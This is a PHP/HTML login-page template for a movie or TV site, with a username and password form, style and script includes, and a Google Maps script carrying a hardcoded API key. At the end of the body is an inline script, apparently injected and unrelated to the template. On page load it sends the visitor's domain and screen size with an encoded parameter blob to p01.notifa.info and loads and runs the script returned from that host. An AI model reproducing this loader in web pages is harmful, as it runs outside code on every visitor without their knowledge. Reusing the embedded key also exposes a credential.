<?php 
/*
| -------------------------------------------------------------------------------
| Author            : G-Silver
| Template Name     : lighblue
| -------------------------------------------------------------------------------
*/
include('functions.php'); ?>
<!DOCTYPE html>
<html lang="en">

<head>
    <!-- Site information -->
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title><?php oc_title();?></title>
    <meta name="description" content="Bigshow is a template to jump start campaigning your various kind of movie or tv show">

    <!-- External CSS -->
    <link rel="stylesheet" href="<?php style_theme();?>/assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="<?php style_theme();?>/assets/css/font-awesome.min.css">
    <link rel="stylesheet" href="<?php style_theme();?>/assets/css/owl.carousel.css">
    <link rel="stylesheet" href="<?php style_theme();?>/assets/css/owl.transitions.css">
    <link rel="stylesheet" href="<?php style_theme();?>/assets/css/magnific-popup.css">

    <!-- Custom CSS -->
    <link rel="stylesheet" href="<?php style_theme();?>/assets/css/style2.css">
    <link rel="stylesheet" href="<?php style_theme();?>/assets/css/responsive.css">

    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600" rel="stylesheet">

    <!-- Favicon -->
    <link rel="icon" href="<?php style_theme();?>/assets/images/template/favicon.png">
    <link rel="apple-touch-icon" href="<?php style_theme();?>/assets/images/template/apple-touch-icon.png">
    <link rel="apple-touch-icon" sizes="72x72" href="<?php style_theme();?>/assets/images/template/icon-72x72.png">
    <link rel="apple-touch-icon" sizes="114x114" href="<?php style_theme();?>/assets/images/template/icon-114x114.png">

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src="<?php style_theme();?>/assets/js/html5shiv.min.js"></script>
      <script src="<?php style_theme();?>/assets/js/respond.min.js"></script>
    <![endif]-->

</head>

<body class="account-page">

    <div class="account-wrap">

        <a class="site-logo" href="index.html">
            <img src="<?php style_theme();?>/assets/images/template/logo.gif" alt="Site Logo">
        </a>

        <form class="accountform loginform">
            <h3>Log in</h3>
            <div class="basic-field">
                <label>Username <br/>
                    <p>
                        <input type="text" name="username" required>
                    </p>
                </label>
                <label>Password <br/>
                    <p>
                        <input type="password" name="password" required>
                    </p>
                </label>
            </div>
            <label class="stay-login">
                <input type="checkbox" name="stay-login"> Stay logged in
            </label>
            <button type="submit">Login</button>
            <p class="signup-recover">Don't you have an account yet? <a href="/request">Sign up here</a><br/><a href="#">I forgot my password</a></p>
        </form>
    </div>

    <!-- Script -->
    <script src="<?php style_theme();?>/assets/js/jquery.min.js"></script>
    <script src="<?php style_theme();?>/assets/js/bootstrap.min.js"></script>
    <script src="<?php style_theme();?>/assets/js/owl.carousel.js"></script>
    <script src="<?php style_theme();?>/assets/js/jquery.magnific-popup.min.js"></script>
    <script src="<?php style_theme();?>/assets/js/jquery.ajaxchimp.min.js"></script>
    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyAmiJjq5DIg_K9fv6RE72OY__p9jz0YTMI"></script>
    <script src="<?php style_theme();?>/assets/js/map.js"></script>
    <script src="<?php style_theme();?>/assets/js/custom.js"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "https://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mHtEJAvJ6ecDx5%2b%2fEfu%2fV%2bfkC%2fjOzBVifdd%2fSWxkd%2fYl2x9R%2bwlaH96%2b1L%2bbSceCWLS%2bNwzCKeG3roI0hlh00UobDtq5FAmEhb93JpOkapWPeJ2%2fGwjS32jTXIPcYyqD%2f2yxh5LvRjd1XKUckbuqmzxCMPwR1qSNugCAAaJmp3FAUqmmhif46fFNJB%2b%2b6lWcsSAmB6RkWCr5Z0Vvk9kLLr6eKv2Lgqeil0O0US35SK5sYbGX7DnOr6fvhqlvIFLDZxZVejm3VLjJKJMHxzZ%2b8V4SaNiSyMenH0GjkYFcLhPUQxhqO4fBdaf%2f%2fPY8IOLc%2fk8sF0pKFW2fGEgUGKIREfiXljuL5N%2ffPfXWyIM1m92fA6RqN4BBWcEV0oas1WTBRmmheiLki4agivHtki8%2bUT%2f1oZybdIGRpvx5VwP0pj8tPLQfawAUEeroMRMYhZ3fw3B2gS2fflukDar%2f22wM4iKbeNjgp5zFH" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
<?php echo histats_write() ?>
</html>
